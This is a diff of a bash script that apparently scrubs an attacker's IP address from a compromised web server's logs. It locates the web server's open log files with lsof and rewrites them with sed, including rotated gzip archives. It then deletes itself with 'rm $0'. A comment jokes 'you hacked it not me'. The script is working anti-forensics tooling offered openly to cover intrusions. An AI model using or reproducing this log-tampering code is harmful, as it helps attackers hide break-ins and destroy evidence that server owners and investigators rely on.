@@ -19,11 +19,19 @@ FreeBSD*) number="\$8,\"/\",\$10"
 *) number=*
 ;;
 esac
-echo "Searching for attacker IP: $ip target machine: $os "
-web_srv="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null |awk {' print $1 '}|uniq`" ### if listening port is default everything will be ok, else change it you hacked it not me .
-[ -z $web_srv ]&& echo -e  "\033[1;31m Web srv not found \033[0m" && exit 
-for line in "`lsof 2>/dev/null| grep $web_srv | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'`";do 
-[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) && mv /tmp/$(basename $line)  $line.$(basename $zp)
-[ -f "$line.*.$zip_type" ]&& echo "old compressed logs found ! " && for zp in  $(ls $line.*.$zip_type) ;do 	
-gzip -cdk $zp | sed 's/'$ip'/'$replace'/g' | gzip >/tmp/$(basename $zp)" ;echo " mv /tmp/$(basename $zp) $line.$(basename $zp) ;done || echo "no such compressed log were found ";done
+comp_cln(){
+for zp in  $(ls ${line[$i]}.[0-9].$zip_type) ;do gzip -cdk $zp | sed 's/'$ip'/'$replace'/g' | gzip >/tmp/$(basename $zp) && echo -e "[\xE2\x9C\x94]  /tmp/$(basename $zp) -> ${line[$i]}.$(basename $zp)" || echo -e "[\xE2\x9D\x8C]  /tmp/$(basename $zp) -> ${line[$i]}.$(basename $zp)" ;done 
+}
+echo "Searching for attacker IP: $ip target machine: $os ,number = $number, type =$zip_type"
+ ### if listening port is default everything will be ok, else change it you hacked it not me .
+web_srv="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null |awk {' print $1 '}|uniq`" 
+[ -z $web_srv ]&& echo -e  "\033[1;31m Running Web server not found \033[0m" && exit 
+ ### looking for log files with lsof, I love array...
+line=($(lsof 2>/dev/null| grep $web_srv | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'))
+for ((i=0;i<${#line[*]};i++ ));do 
+ ### ip edit in file.
+[ "`grep -m 1  $ip ${line[$i]}`" ]&& sed -ie 's/'$ip'/'$replace'/g' ${line[$i]} 
+echo "Searching for old files ${line[$i]}.*.$zip_type"
+[  "`ls ${line[$i]}* | grep $zip_type `" ]&& comp_cln
+done
 rm $0
